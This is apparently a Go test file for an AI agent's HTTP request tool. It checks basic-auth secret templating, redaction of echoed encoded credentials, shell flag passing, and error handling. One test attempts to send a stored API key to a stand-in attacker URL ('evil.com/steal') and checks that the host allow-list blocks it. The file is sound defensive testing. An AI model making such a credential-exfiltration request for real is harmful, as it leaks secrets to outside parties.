package tools

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// basicAuthTool builds an http_request tool whose secret store holds
// custom.api_key, allowed for host.
func basicAuthTool(t *testing.T, host string) *Tool {
	t.Helper()
	store := writeTestSecrets(t, fmt.Sprintf(`
[custom]
api_key = "sk-secret-123"
allowed_hosts = [%q]
`, host))
	return NewHTTPRequestTool(store, nil, "", func() int { return 0 }, func() int64 { return 50 * 1024 * 1024 }, func() int64 { return 0 }, func() int64 { return 0 }, nil, 0640)
}

// TestHTTPRequestBasicAuthResolvesSecretThenEncodes proves basic_auth resolves
// a {{secret:}} template and only then base64-encodes "user:pass" (#2141). The
// agent cannot encode a secret it never sees, so an Authorization: Basic header
// built from a template sent the literal key, unencoded. Companies House is the
// real case: the key is the username and the password is empty.
func TestHTTPRequestBasicAuthResolvesSecretThenEncodes(t *testing.T) {
	t.Parallel()
	var gotUser, gotPass string
	var gotOK bool
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotUser, gotPass, gotOK = r.BasicAuth()
		fmt.Fprint(w, "ok")
	}))
	defer srv.Close()

	tool := basicAuthTool(t, srv.Listener.Addr().(*net.TCPAddr).IP.String())
	params, _ := json.Marshal(map[string]any{
		"url":        srv.URL,
		"basic_auth": "{{secret:custom.api_key}}:",
	})
	if _, err := tool.Execute(context.Background(), params); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !gotOK || gotUser != "sk-secret-123" || gotPass != "" {
		t.Errorf("server got basic auth (%q, %q, ok=%v), want (\"sk-secret-123\", \"\", ok=true)", gotUser, gotPass, gotOK)
	}
}

// TestHTTPRequestBasicAuthPasswordKeepsColons proves only the FIRST colon
// splits user from password: RFC 7617 forbids a colon in the user-id but
// allows one in the password.
func TestHTTPRequestBasicAuthPasswordKeepsColons(t *testing.T) {
	t.Parallel()
	var gotUser, gotPass string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotUser, gotPass, _ = r.BasicAuth()
		fmt.Fprint(w, "ok")
	}))
	defer srv.Close()

	tool := basicAuthTool(t, srv.Listener.Addr().(*net.TCPAddr).IP.String())
	params, _ := json.Marshal(map[string]any{
		"url":        srv.URL,
		"basic_auth": "me:{{secret:custom.api_key}}:x",
	})
	if _, err := tool.Execute(context.Background(), params); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if gotUser != "me" || gotPass != "sk-secret-123:x" {
		t.Errorf("server got (%q, %q), want (\"me\", \"sk-secret-123:x\")", gotUser, gotPass)
	}
}

// TestHTTPRequestBasicAuthEchoRedacted proves a server echoing the
// Authorization header cannot put the ENCODED secret into agent context. The
// store redacts only the raw secret, and base64 hides it from that scan, so the
// encoded credential needs its own redaction, in the header block, the --json
// headers and the body alike.
func TestHTTPRequestBasicAuthEchoRedacted(t *testing.T) {
	t.Parallel()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Echo-Auth", r.Header.Get("Authorization"))
		fmt.Fprintf(w, `{"authorization":%q}`, r.Header.Get("Authorization"))
	}))
	defer srv.Close()

	encoded := base64.StdEncoding.EncodeToString([]byte("sk-secret-123:"))
	tool := basicAuthTool(t, srv.Listener.Addr().(*net.TCPAddr).IP.String())
	params, _ := json.Marshal(map[string]any{
		"url":             srv.URL,
		"basic_auth":      "{{secret:custom.api_key}}:",
		"include_headers": true,
	})
	for _, tc := range []struct {
		name string
		ctx  context.Context
	}{
		{"text", context.Background()},
		{"json", WithOutputHints(context.Background(), OutputHints{Format: OutputFormatJSON})},
	} {
		t.Run(tc.name, func(t *testing.T) {
			result, err := tool.Execute(tc.ctx, params)
			if err != nil {
				t.Fatalf("Execute: %v", err)
			}
			if strings.Contains(result.Text, encoded) {
				t.Errorf("the encoded credential reached the result:\n%s", result.Text)
			}
			if !strings.Contains(result.Text, "[REDACTED]") {
				t.Errorf("expected a [REDACTED] marker where the echo was:\n%s", result.Text)
			}
		})
	}
}

// TestHTTPRequestBasicAuthHostLocked proves a secret in basic_auth gets the
// same allowed_hosts check as one in a header: it must not reach another host.
func TestHTTPRequestBasicAuthHostLocked(t *testing.T) {
	t.Parallel()
	tool := basicAuthTool(t, "api.allowed.com")
	params, _ := json.Marshal(map[string]any{
		"url":        "https://evil.com/steal",
		"basic_auth": "{{secret:custom.api_key}}:",
	})
	_, err := tool.Execute(context.Background(), params)
	if err == nil || !strings.Contains(err.Error(), "not in allowed_hosts") {
		t.Fatalf("want an allowed_hosts rejection, got %v", err)
	}
}

// TestHTTPRequestBasicAuthShellFlag proves foci_http_request --basic-auth
// passes the value through verbatim as the basic_auth param. The function is
// hand-rolled, so the schema alone does not give it the flag.
func TestHTTPRequestBasicAuthShellFlag(t *testing.T) {
	t.Parallel()
	body := generateShellFunc(httpToolForShellTest())
	out, code := runShellFunc(t, body, `foci_http_request https://example.com --basic-auth '{{secret:custom.api_key}}:'`)
	if code != 0 {
		t.Fatalf("exit %d\n%s", code, out)
	}
	if !strings.Contains(out, `"basic_auth":"{{secret:custom.api_key}}:"`) {
		t.Errorf("foci-call params lack basic_auth\ngot:\n%s", out)
	}
}

// TestHTTPRequestBasicAuthRejects covers the refusals: a value with no colon
// (not user:pass, and the error must not echo the resolved secret) and a
// basic_auth alongside an explicit Authorization header (ambiguous: one would
// silently overwrite the other).
func TestHTTPRequestBasicAuthRejects(t *testing.T) {
	t.Parallel()
	tool := basicAuthTool(t, "127.0.0.1")
	for _, tc := range []struct {
		name    string
		params  map[string]any
		wantErr string
	}{
		{"no colon", map[string]any{"basic_auth": "{{secret:custom.api_key}}"}, "user:password"},
		{"with Authorization header", map[string]any{
			"basic_auth": "u:p",
			"headers":    map[string]string{"authorization": "Bearer x"},
		}, "Authorization"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			tc.params["url"] = "http://127.0.0.1:1/"
			params, _ := json.Marshal(tc.params)
			_, err := tool.Execute(context.Background(), params)
			if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("want error containing %q, got %v", tc.wantErr, err)
			}
			if strings.Contains(err.Error(), "sk-secret-123") {
				t.Errorf("error leaks the resolved secret: %v", err)
			}
		})
	}
}
